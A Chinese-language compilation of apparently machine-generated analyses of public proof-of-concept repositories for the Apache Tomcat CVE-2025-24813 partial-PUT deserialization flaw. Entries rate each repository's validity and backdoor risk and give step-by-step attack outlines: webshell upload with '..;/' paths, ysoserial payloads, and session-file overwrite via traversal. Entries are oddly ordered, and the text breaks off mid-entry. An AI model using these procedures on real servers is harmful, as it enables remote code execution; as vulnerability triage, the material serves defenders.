**漏洞类型:** 路径等价性漏洞/远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2

**利用条件:** 需要满足以下条件：默认Servlet的写入已启用（默认禁用）、支持部分PUT（默认启用）、应用程序使用Tomcat基于文件的会话持久性，默认存储位置、应用程序包含可在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞，源于对包含特殊字符（特别是分号“;”）的 URL 的解析不一致。这种不一致允许攻击者构造恶意 URL，该 URL 被安全检查组件和文件服务组件以不同的方式解释。如果启用了`default` servlet 的写权限和启用了`partial PUT`，并且使用了存在反序列化漏洞的依赖， 攻击者可以通过上传恶意文件（例如，JSP webshell），然后利用构造的包含 `..;/` 的 URL 来绕过安全限制，最终在服务器上实现远程代码执行(RCE)。

**有效性评估：**

根据漏洞描述和搜索结果，此漏洞已在野外被积极利用。漏洞利用代码中的 `README.md` 文件详细描述了漏洞原理、攻击链和利用方式，表明该 PoC 代码具备一定的有效性。

**投毒风险评估：**

分析了漏洞利用代码目录下的 `LICENSE` 和 `README.md` 文件，未发现明显的恶意代码。但任何 PoC 代码都存在潜在风险，不应在生产环境直接运行。 无法保证作者没有在其他文件中添加隐藏的后门代码。因此, 投毒风险评估为10%。

**漏洞利用方式：**

1.  **上传恶意 Payload：** 攻击者通过 Web 应用程序的文件上传功能，将恶意的 JSP Web Shell（例如 `shell.jsp`）上传到已知的非可执行目录，例如 `/uploads`。
2.  **发现Endpoint：** 攻击者识别服务器上一个合法的，可执行的 JSP 端点，例如 `/user/profile.jsp`。
3.  **构造和执行攻击URL：** 攻击者构造最终 URL，其中包含 `..;/` 序列来绕过安全检查。例如：`/app/user/..;/uploads/shell.jsp`。当服务器接收到此请求时，安全管理器可能只检查 `/app/user/` 的权限，而文件系统解析器会处理 `../` 并执行 `/uploads/shell.jsp` 中的代码。

**修复建议：**

*   升级到 Apache Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
*   禁用 default servlet 的写权限，除非绝对必要。
*   审查并更新应用程序依赖，移除存在反序列化漏洞的库。

**项目地址:** [threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat](https://github.com/threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #47

**来源**: [CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：1. writes enabled for the default servlet (默认禁用); 2. 支持 partial PUT (默认启用); 3. 使用 Tomcat 的 file based session persistence 和默认存储位置; 4. 应用包含一个可能被用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 远程代码执行漏洞，利用了 Tomcat 处理部分 PUT 请求的方式。攻击者可以通过上传恶意构造的文件（利用 Ysoserial 生成反序列化 payload）到 Tomcat 服务器，然后通过 GET 请求触发反序列化，从而执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索引擎结果（Rapid7, GreyNoise, socprime 等）以及提供的 POC 代码，可以判断该漏洞是有效的，并且已经被观察到在野利用。POC 代码通过生成多种 Ysoserial payload 并尝试上传，增加了漏洞利用成功的概率。

**投毒风险分析：**

分析提供的 POC 代码，发现其主要功能是利用 ysoserial 生成反序列化 payload，然后通过 PUT 和 GET 请求触发漏洞。代码本身没有明显的恶意行为，例如向其他服务器发送信息或篡改本地文件。主要风险在于使用未经验证的第三方库（ysoserial），这本身可能存在安全风险，但是这是漏洞利用本身的一部分，而不是作者额外添加的恶意代码。

评估投毒风险较低，约为5%。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 服务器需要满足特定配置条件，包括开启了 default servlet 的写入权限，支持 partial PUT，并且应用使用了 Tomcat 的文件会话持久化功能，且包含可被利用的反序列化库。
2.  **生成 Payload：** 使用 ysoserial 工具生成包含恶意命令的反序列化 payload。POC 代码支持批量生成不同 gadget chain 的 payload，提高成功率。
3.  **PUT 请求：** 通过 PUT 请求，将生成的 payload 分段上传到目标 Tomcat 服务器。利用 Content-Range 头部模拟 partial PUT 请求。
4.  **GET 请求：** 通过 GET 请求，触发 Tomcat 对上传文件的反序列化操作，从而执行恶意代码。
5.  **执行命令：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [tonyarris/CVE-2025-24813-PoC](https://github.com/tonyarris/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #48

**来源**: [CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md](../2025/CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入(disabled by default), 支持partial PUT(enabled by default), application 使用了Tomcat基于文件的session持久化，使用了默认的存储位置，并且application包含可被反序列化攻击利用的library。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，可能导致远程代码执行和/或信息泄露。该漏洞的根源在于对文件名的处理方式，特别是内部点（'file.Name'）。

**漏洞利用方式分析：**

根据漏洞库信息和搜索结果，该漏洞存在两种利用方式：

1.  **信息泄露/恶意内容注入：** 如果满足以下条件，攻击者能够查看敏感文件或注入恶意内容：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   目标URL是公共上传URL的子目录。
    *   攻击者知道敏感文件名。
    *   使用 partial PUT 上传敏感文件。

2.  **远程代码执行（RCE）：** 如果满足以下条件，攻击者能够执行任意代码：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   应用程序使用Tomcat的基于文件的session持久化，并使用默认存储位置。
    *   应用程序包含一个可以用于反序列化攻击的library。

**POC 代码分析：**

POC代码`CVE_2025_24813.py`实现了以下功能：

1.  **检查Servlet是否可写：** 使用PUT请求向目标URL上传文件，检查HTTP响应状态码，以确定服务器是否允许写入。
2.  **生成ysoserial payload：** 使用ysoserial工具生成反序列化payload，需要指定命令、ysoserial路径和gadget。
3.  **生成Java payload：**  生成一个简单的java文件, 然后通过javac编译为class文件, 再打包为jar文件。
4.  **上传和验证payload：** 上传生成的payload到Tomcat服务器, 利用路径穿越漏洞，覆盖session文件，从而执行代码。

**有效性评估：**

根据搜索结果，CVE-2025-24813漏洞正在被积极利用。POC代码涵盖了漏洞利用的关键步骤，包括写入性验证、payload生成和上传，因此可以认为是有效的，但利用成功与否取决于目标环境是否满足利用条件。

**投毒风险评估：**

通过分析POC代码，发现存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖外部工具ysoserial：**  POC代码依赖于ysoserial工具生成反序列化payload。虽然ysoserial是一个常用的漏洞利用工具，但如果用户下载了被篡改的ysoserial版本，可能会执行恶意代码。虽然POC本身没有直接植入恶意代码，但依赖的外部资源存在被投毒的风险。
2.  **执行任意命令：**  该脚本允许执行任意命令。如果攻击者控制了用户运行脚本的环境，可以修改脚本，执行恶意的系统命令，从而控制目标系统。

综合考虑，该POC代码的投毒风险较低，约为5%。大部分代码是用于漏洞利用，风险主要来源于对外部依赖的信任和对执行环境的控制。


**项目地址:** [u238/Tomcat-CVE_2025_24813](https://github.com/u238/Tomcat-CVE_2025_24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #49

**来源**: [CVE-2025-24813-uzairhaider502_CVE-2025-24813.md](../2025/CVE-2025-24813-uzairhaider502_CVE-2025-24813.md)

# CVE-2025-24813

> 📦 该CVE有 **52** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-24813-137f_Poc-CVE-2025-24813.md](../2025/CVE-2025-24813-137f_Poc-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 开启Partial PUT (默认开启), 应用使用基于文件的session持久化(默认位置), 应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，利用了路径等价性（内部点，例如 `file.Name`）结合启用了写入功能的默认 Servlet 和 Partial PUT 功能。该漏洞可能导致远程代码执行（RCE）、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用方式:**

1.  **前提条件:** 漏洞利用需要满足以下条件：
    *   默认 Servlet 开启写入 (disabled by default).
    *   支持 Partial PUT (enabled by default).
    *   对于RCE，应用需要使用 Tomcat 基于文件的 session 持久化，并且包含一个可以被反序列化攻击利用的库（例如，存在于classpath中的commons-collections）。
    *   对于信息泄露/文件篡改，需要攻击者了解敏感文件的上传目标 URL 位于公共上传目标 URL 的子目录下，且攻击者需要知道上传的敏感文件名，且敏感文件通过partial PUT上传。
2.  **漏洞利用步骤:**
    *   **获取 Session ID:** 攻击者首先需要获取一个有效的 JSESSIONID，可以通过访问 `/index.jsp` 获取，如果无法获取则使用默认值。
    *   **测试 PUT 方法:** 攻击者发送一个 PUT 请求来确认目标服务器是否允许使用 `Content-Range` 进行部分写入。
    *   **生成 Payload:**  攻击者使用 `ysoserial` 或者 Java 代码生成一个恶意的序列化对象。`ysoserial` 通过指定的 gadget（例如 `CommonsCollections6`）来执行命令。也可以生成一个包含恶意命令执行的Java .jar文件。
    *   **上传 Payload:**  攻击者利用路径遍历将 payload 上传到 Tomcat 的 session 目录。例如，`/uploads/../sessions/{JSESSIONID}.session`。
    *   **触发执行:**  攻击者使用包含恶意 JSESSIONID 的请求来访问应用程序。Tomcat 将会反序列化该 session 文件，从而执行攻击者注入的命令。

**有效性:**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞的 POC 代码**有效**。搜索结果中提到了该漏洞已被积极利用。提供的 POC 代码包含利用该漏洞进行 RCE 的 Python 脚本，并提供了详细的利用步骤和参数说明。

**投毒风险:**

评估提供的 POC 代码，投毒风险较低，约为 **10%**。主要考虑因素如下：

*   **代码结构:** 代码结构较为清晰，主要分为获取 Session ID、验证 PUT 方法、生成 Payload 和发送 Payload 等几个模块。
*   **依赖项:**  代码依赖 `ysoserial.jar`，这本身是一个已知的漏洞利用工具，如果攻击者替换了 `ysoserial.jar` 文件，则可能引入恶意代码。此外，java payload方式需要服务器具有java编译环境。
*   **潜在风险:**  `java_payload` 函数中使用 `Runtime.getRuntime().exec(c)` 直接执行命令，如果命令字符串 `cmd` 构造不当，可能会存在命令注入的风险。
*   **作者声明:**  README 文件中包含免责声明，说明该代码仅用于教育目的，这在一定程度上降低了作者进行恶意投毒的可能性。

总的来说，虽然代码本身看起来没有明显的恶意行为，但仍然需要谨慎使用，并确保从可信的来源获取 `ysoserial.jar`，并仔细检查命令字符串，避免引入额外的安全风险。 java payload方式需要服务器具有java编译环境,具有一定局限性。

**项目地址:** [137f/Poc-CVE-2025-24813](https://github.com/137f/Poc-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #2

**来源**: [CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露，文件被篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足特定配置条件，包括启用Default Servlet的写入功能，启用partial PUT支持，存在安全敏感文件上传的目标URL位于公共上传目标URL的子目录中，攻击者已知安全敏感文件的名称，以及安全敏感文件通过partial PUT上传。或者，启用Default Servlet的写入功能，启用partial PUT支持，应用程序使用Tomcat基于文件的会话持久性与默认存储位置，应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息，CVE-2025-24813 涉及 Apache Tomcat 的路径等效问题，可能导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。利用条件包括Default Servlet启用了写入，支持partial PUT，以及应用程序的特定配置。搜索引擎结果显示，该漏洞已被公开并被积极利用。

提供的 POC 代码尝试利用该漏洞。它首先使用 `argparse` 处理目标 URL 参数。然后，它包含一段 base64 编码的 payload，该 payload 是一个经过序列化的 Java 对象，旨在执行命令 `touch /tmp/RCE-success`。  该脚本将解码后的payload保存到`decoded_chain.bin`文件中。 然后，使用 `requests.put` 函数，通过构造包含 'Content-Range' 头部的 PUT 请求，利用 Tomcat 的 partial PUT 功能，将payload上传到目标服务器。PUT请求的目标URL是`TARGET_IP/payload.session`。脚本上传完成后删除临时文件。 最后使用Cookie进行getSession。

**有效性评估：** POC 的有效性取决于目标 Tomcat 服务器是否满足漏洞利用的全部条件。如果 Default Servlet 的写入已启用，并且启用了 partial PUT 支持，并且满足其他条件，则 POC 可能有效。

**投毒风险评估：** 仔细检查提供的 POC 代码，没有发现明显的投毒代码。该代码旨在利用已知的 Tomcat 漏洞，而不是在目标系统上植入后门或执行恶意操作。 代码中包含的base64编码的payload部分是最有可能存在风险的部分，但是payload中的命令是`touch /tmp/RCE-success`，该命令仅仅是创建一个文件，用于验证漏洞是否存在，并非恶意操作。

**利用方式总结：**

1.  **条件确认:** 确认目标 Tomcat 服务器启用了 Default Servlet 的写入功能，并启用了 partial PUT 支持，以及是否满足其他相关条件。
2.  **Payload 生成:**  生成一个恶意 Java 序列化对象，该对象可以执行任意代码，或者读取敏感文件。
3.  **Partial PUT 上传:**  使用 HTTP PUT 请求，通过设置 `Content-Range` 头部，将恶意 payload 分块上传到目标服务器上的特定路径（例如，`payload.session`）。
4.  **触发反序列化：**  Tomcat 尝试反序列化上传的文件，从而触发恶意代码的执行。


**项目地址:** [Alaatk/CVE-2025-24813-POC](https://github.com/Alaatk/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #3

**来源**: [CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md](../2025/CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：默认Servlet开启写入 (默认关闭)，支持Partial PUT (默认开启)，存在安全敏感文件的目标URL是公共上传目标URL的子目录，攻击者知晓敏感文件名，安全敏感文件通过Partial PUT上传，或应用程序使用Tomcat文件会话持久性（默认位置），应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞。该漏洞允许攻击者通过精心构造的包含内部点（file.Name）的文件名，利用默认Servlet中启用的写入功能和Partial PUT支持，进行远程代码执行、信息泄露和恶意内容注入。根据漏洞描述，攻击成功的关键在于Tomcat的配置以及应用程序是否使用了易受攻击的组件。

**有效性：** 从搜索结果来看，该漏洞已被确认存在并且有在野利用。但是，漏洞利用需要满足多个非默认配置条件，因此并非所有Tomcat实例都易受攻击。提供的POC代码 `/tmp/9a20e2370d216dc00af3f4d6145c600e/README.md` 内容过于简单，仅包含CVE编号，并不能直接用于漏洞利用，需要根据具体情况编写特定的利用代码，例如构造恶意的PUT请求。

**投毒风险：** 提供的POC代码非常简单，主要就是包含 CVE-2025-24813 的 README.md 文件。因此，投毒风险很低，但是不排除作者在其他相关文件中隐藏恶意代码的可能性，只是没有在此次提交中呈现，考虑到文件数量极少,故判断存在10%的投毒风险。

**利用方式：** 漏洞利用主要通过以下步骤：

1.  **利用Partial PUT上传恶意文件：** 攻击者构造包含内部点的文件名，并通过Partial PUT请求将其上传到目标服务器。
2.  **绕过路径检查：** 由于路径等价性问题，Tomcat可能无法正确处理包含内部点的文件名，导致绕过路径检查。
3.  **信息泄露/恶意内容注入：** 如果目标是信息泄露或恶意内容注入，攻击者需要知道目标敏感文件的名称和路径，然后通过覆盖或修改该文件来实现目的。
4.  **远程代码执行：** 如果应用程序使用了Tomcat的文件会话持久性，并且包含可用于反序列化攻击的库，攻击者可以利用该漏洞将恶意序列化对象写入会话文件，从而实现远程代码执行。攻击者可能会覆盖session文件，然后触发反序列化。

**总结：** CVE-2025-24813 是一个高危漏洞，但是利用条件较为苛刻。 提供的POC代码过于简单，无法直接用于攻击，需要根据目标环境进行定制。在实际环境中，需要仔细评估Tomcat的配置和应用程序的安全性，以确定是否存在被利用的风险。同时需要关注针对该漏洞的攻击尝试并及时采取缓解措施，例如禁用默认Servlet的写入功能或升级到修复版本。

**项目地址:** [AlperenY-cs/CVE-2025-24813](https://github.com/AlperenY-cs/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #4

**来源**: [CVE-2025-24813-AsaL1n_CVE-2025-24813.md](../2025/CVE-2025-24813-AsaL1n_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危 (取决于配置和利用方式，可能导致RCE、敏感信息泄露或文件内容篡改)

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** RCE需要满足以下条件：writes enabled for default servlet, support for partial PUT, 使用Tomcat文件session持久化默认位置, 应用包含可被反序列化攻击利用的库。信息泄露/内容篡改需要满足以下条件：writes enabled for default servlet, support for partial PUT, security sensitive上传URL是公共上传URL的子目录, 攻击者知道security sensitive文件的名字, security sensitive文件也是通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是一个Apache Tomcat中的路径等价性漏洞，源于对文件名中内部点（'file.Name'）处理不当。根据漏洞描述和搜索结果，此漏洞在特定配置下可能导致远程代码执行（RCE）、信息泄露或恶意内容被添加到上传文件中。

**有效性：**
根据搜索引擎结果和漏洞描述，该漏洞已被积极利用。提供的PoC代码利用了Tomcat的partial PUT特性以及session持久化机制（在满足一定条件下），尝试通过上传恶意序列化数据来实现RCE。

**利用方式：**
1.  **前提条件：**
    *   Tomcat的default servlet需要开启写入功能（默认关闭）。
    *   需要启用partial PUT支持（默认开启）。
    *   （RCE）应用使用Tomcat的文件session持久化，且为默认存储位置。
    *   （RCE）应用包含可被反序列化攻击利用的库，例如存在fastjson, jackson等。
    *   （信息泄露/内容篡改）存在安全敏感文件上传URL是公共上传URL的子目录， 且攻击者知道该敏感文件名。
2.  **攻击步骤：**
    *   攻击者构造一个恶意的序列化对象，对其进行Base64编码（PoC中`-d/--data` 参数）。
    *   攻击者指定目标URL（PoC中`-u/--url` 参数）。
    *   PoC脚本首先向目标URL发送PUT请求，其中`Content-Range`头指定了上传的范围，利用Tomcat的partial PUT特性。
    *   如果服务器返回409状态码，则表示partial PUT已成功处理。
    *   之后，PoC脚本会发送GET请求，并携带包含恶意序列化数据的JSESSIONID cookie（`.{random_str}`）。
    *   Tomcat反序列化session数据，从而触发RCE (如果满足RCE条件)。

**投毒风险：**
分析提供的PoC代码和Readme，可以发现：
*   脚本本身的功能是利用漏洞进行攻击。
*   脚本中没有发现明显的恶意代码，例如植入后门、篡改系统文件等。
*   脚本需要用户提供Base64编码的序列化数据，这意味着攻击者需要自行生成payload，脚本只是负责发送payload。
*   Readme中指明了利用方式及所需条件，较为详细。

因此，该仓库中存在作者隐藏的恶意代码的可能性较低，但不能完全排除。投毒风险评估为 10%。风险主要在于用户可能下载了被篡改过的poc，或者运行了来历不明的payload, 这些payload可能包含恶意行为。

**项目地址:** [AsaL1n/CVE-2025-24813](https://github.com/AsaL1n/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #5

**来源**: [CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露和文件被恶意修改

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (Tomcat 默认支持), 文件会话持久化启用 (context.xml 配置 PersistentManager 和 FileStore), 存在反序列化利用链 (类路径下包含存在漏洞的库)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，该漏洞源于 'file.Name' (内部点) 的处理不当。如果满足以下所有条件，则可能导致远程代码执行，信息泄露或文件篡改：

1.  **DefaultServlet 写入功能启用：** 必须在 `web.xml` 中配置 `readonly=false`，允许 DefaultServlet 写入文件。
2.  **Partial PUT 请求支持：** Tomcat 默认支持分块上传，允许攻击者通过分块上传恶意文件。
3.  **文件会话持久化启用：** 需要在 `context.xml` 中配置 `PersistentManager` 和 `FileStore`，启用基于文件的会话存储。
4.  **存在反序列化利用链：** 类路径下需要包含存在漏洞的库（例如，`commons-collections-3.2.1.jar`），使得攻击者可以通过反序列化漏洞执行任意代码。
5.  **信息泄露/文件篡改的先决条件:** 除了上述条件外，还需要满足：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**利用方式：**

1.  攻击者首先利用 Partial PUT 请求上传一个恶意构造的序列化对象，该对象包含一个反序列化利用链（例如，使用 Commons Collections）。
2.  由于启用了 DefaultServlet 的写入功能，恶意文件可以被写入到 Tomcat 的会话存储目录中。
3.  当 Tomcat 尝试反序列化该会话时，由于存在利用链，攻击者可以执行任意代码。
4. 若目标满足信息泄露/文件篡改的先决条件,攻击者可以通过构造恶意的Partial PUT请求，利用路径等价绕过限制，最终实现信息泄露或者文件篡改

**投毒风险分析：**

该POC代码提供了一个 Docker Compose 文件，用于搭建易受攻击的 Tomcat 环境。该环境配置了必要的组件（DefaultServlet 写入，Partial PUT，文件会话持久化），并且包含了一个 Commons Collections 库，可以用于反序列化攻击。

代码本身看起来是直接了当的漏洞演示。投毒风险较低，但是使用该POC时仍需注意。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的利用代码来看，该漏洞已经确认被利用，并且相关的利用方式和利用条件已经比较清晰。提供的POC代码针对的是 RCE 部分，有效性较高，但成功利用取决于是否满足所有前提条件。

**项目地址:** [B1gN0Se/Tomcat-CVE-2025-24813](https://github.com/B1gN0Se/Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #6

**来源**: [CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence/Partial PUT RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/Partial PUT远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet启用写入(默认禁用)，启用Partial PUT(默认启用)，目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且通过Partial PUT上传敏感文件。RCE还需要应用程序使用Tomcat的文件会话持久性，以及存在可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合启用了写入功能的默认Servlet和Partial PUT功能，可能导致远程代码执行和敏感信息泄露。漏洞利用方式如下：

1.  **信息泄露/内容注入:** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   目标URL是公共上传URL的子目录
    *   攻击者知道敏感文件名
    *   通过Partial PUT上传敏感文件
攻击者可以查看敏感文件或向其中注入恶意内容。

2.  **远程代码执行 (RCE):** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   应用程序使用Tomcat的文件会话持久性，且使用默认存储位置
    *   应用程序包含可利用的反序列化库
攻击者可以通过上传恶意序列化session文件，利用反序列化漏洞执行任意代码。

**有效性：**
根据搜索结果，CVE-2025-24813漏洞存在活跃的利用。PoC代码的README描述了一个基本的利用流程，包括克隆仓库、安装依赖、运行PoC脚本，表明该PoC可能有效，但具体利用成功与否取决于目标环境的配置是否满足漏洞利用条件。PoC的有效性较高，因为搜索结果显示该漏洞正在被积极利用。

**投毒风险：**
分析提供的PoC代码（README.md），投毒风险较低。README.md文件只包含漏洞描述、环境配置、使用方法和免责声明。虽然PoC代码没有直接展示`poc.py`的内容，但是根据描述`poc.py`脚本会提示用户输入目标URL，表明其功能是针对目标进行漏洞验证而非植入后门。当然，`poc.py`本身可能包含恶意代码。在没有查看 `poc.py` 的内容的情况下，预估`poc.py`存在投毒代码的可能性较低，大约10%。主要考虑到以下几点：

*   PoC旨在验证漏洞的存在，而非长期控制目标系统。
*   公开的PoC代码通常会接受安全社区的审查，增加投毒的难度。
*   作者声明仅用于教育和研究目的。

**利用方式总结：**
攻击者利用此漏洞的方式是，首先需要满足前置条件（Default Servlet开启写入、Partial PUT启用等）。然后，通过构造恶意的PUT请求，并利用路径等价，覆盖或者修改敏感文件，实现信息泄露或RCE。RCE场景依赖于反序列化漏洞的利用，需要上传精心构造的恶意序列化数据。

**项目地址:** [CEAlbez/CVE-2025-24813-PoC](https://github.com/CEAlbez/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #7

**来源**: [CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md](../2025/CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 1. 默认Servlet开启了写入 (默认禁用)
2. 支持Partial PUT (默认启用)
3. 应用使用Tomcat基于文件的Session持久化, 使用默认存储位置
4. 应用包含可被反序列化攻击利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用 'file.Name' (内部点) 来实现远程代码执行和/或信息泄露，以及/或通过启用了写入的默认 Servlet 向上传的文件添加恶意内容。

**漏洞利用方式：**
1.  **信息泄露/恶意内容添加：**  如果满足以下条件，攻击者可以查看安全敏感文件或向其中注入内容：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   通过 Partial PUT 上传安全敏感文件。

2.  **远程代码执行：**  如果满足以下条件，攻击者可以执行远程代码：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的会话持久性，并且使用默认的存储位置。
    *   应用程序包含一个可以用于反序列化攻击的库。

**POC分析：**
POC利用脚本`CVE_2025_24813.py`的利用流程大概如下：
1.  检查目标服务器的默认servlet是否开启PUT方法，主要通过PUT请求上传一个文件来判断.
